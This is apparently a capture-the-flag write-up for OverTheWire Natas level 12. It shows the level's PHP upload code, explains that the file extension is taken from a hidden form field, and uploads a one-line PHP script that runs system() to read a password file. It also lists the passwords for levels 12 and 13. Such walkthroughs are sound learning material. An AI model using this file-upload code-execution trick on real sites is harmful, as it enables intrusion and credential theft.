<h2>🔰 Level - 12</h2>

- username - natas12
- password - YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

	This time, the site gives an option to upload a jpeg file. Link for sourcecode was also given. <br>
	```php
	<?php

	function genRandomString() {
	    $length = 10;
	    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
	    $string = "";

	    for ($p = 0; $p < $length; $p++) {
	        $string .= $characters[mt_rand(0, strlen($characters)-1)];
	    }

	    return $string;
	}

	function makeRandomPath($dir, $ext) {
	    do {
	    $path = $dir."/".genRandomString().".".$ext;
	    } while(file_exists($path));
	    return $path;
	}

	function makeRandomPathFromFilename($dir, $fn) {
	    $ext = pathinfo($fn, PATHINFO_EXTENSION);
	    return makeRandomPath($dir, $ext);
	}

	if(array_key_exists("filename", $_POST)) {
	    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


	        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
	        echo "File is too big";
	    } else {
	        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
	            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
	        } else{
	            echo "There was an error uploading the file, please try again!";
	        }
	    }
	} else {
	?>
	```
	This code stores the input file with a randomly generated string as name, in the upload directory. <br>
	```html 
	<form enctype="multipart/form-data" action="index.php" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
	<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
	Choose a JPEG to upload (max 1KB):<br/>
	<input name="uploadedfile" type="file" /><br />
	<input type="submit" value="Upload File" />
	</form>
	<?php } ?>
	```
	Now, within the rest of html code, it passes two more inputs of hidden type. One is a file name.<br>
	In the above php code, the extension in which uploaded file is saved is taken not from the actual uploaded file, but from this hidden input. <br>
	That is, the extension of the file we upload doesn't matter.<br>

	After uploading the file, a link to file was displayed in the form `upload/xxxxxxxxxx.jpg`  <br>
	So, when clicked, this path is added to url and is visited by the browser. <br>

	An interesting idea is that, if a php file, instead of jpg or txt, is opened in a browser, it actually executes the php script within the file. All we need to do is create a sample php script and pass it to the input field.<br>

	So I created a simple php script to cat out the password. <br>

	```php
	<?php
	system("cat /etc/natas_webpass/natas13");
	?>
	```
	I uploaded this file, then changed the extension in the inline php script from jpg to php. When the link to uploaded file was displayed, it was a link the php file I uploaded. Opened the link and got the password. <br>

Password for level 13 - lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9